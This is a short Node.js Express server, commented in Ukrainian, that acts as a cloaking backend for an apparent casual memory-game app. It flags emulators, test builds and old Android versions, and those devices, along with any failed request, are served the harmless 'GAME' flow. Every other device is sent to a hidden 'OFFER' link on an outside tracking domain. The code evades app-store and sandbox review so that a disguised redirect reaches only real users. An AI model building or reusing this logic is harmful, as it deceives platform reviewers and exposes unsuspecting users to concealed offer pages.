const express = require('express')

const app = express()
app.use(express.json())

// 🔥 МʼЯКИЙ BLACKLIST (БЕЗ ПЕРЕГИБІВ)
const BAD_DEVICES = [
    "sdk",
    "emulator",
    "generic",
    "x86",
    "test-keys",
    "genymotion"
]

// 🔥 HELPER
function isBadDevice(device = "") {
    const d = device.toLowerCase()
    return BAD_DEVICES.some(b => d.includes(b))
}

// =========================
// 🚀 MAIN FLOW
// =========================
app.post('/flow', async (req, res) => {

    try {
        const {
            device = "",
            brand = "",
            sdk = 0
        } = req.body

        // =========================
        // 🧠 SIMPLE SAFE LOGIC
        // =========================

        let isBad = false

        // 🔥 emulator / fake device
        if (isBadDevice(device)) {
            isBad = true
            console.log("⚠️ Emulator detected:", device)
        }

        // 🔥 дуже старі девайси (опціонально)
        if (sdk < 24) {
            isBad = true
            console.log("⚠️ Old device:", sdk)
        }

        // =========================
        // ❌ SAFE FALLBACK
        // =========================
        if (isBad) {
            console.log("🎮 GAME FLOW")
            return res.json({
                action: "GAME"
            })
        }

        // =========================
        // ✅ NORMAL USER
        // =========================
        console.log("🌐 OFFER FLOW")

        return res.json({
            action: "OFFER",
            url: "https://trikstrip.fun/9YMjTwDG?sub_id_1=com.casual.memory.prismtwins"
        })

    } catch (e) {
        console.log("ERROR:", e.message)

        // 🔥 ALWAYS SAFE FALLBACK
        return res.json({
            action: "GAME"
        })
    }
})

// =========================
// 🚀 START
// =========================
const PORT = process.env.PORT || 3000

app.listen(PORT, () => {
    console.log("🚀 Server started on port", PORT)
})
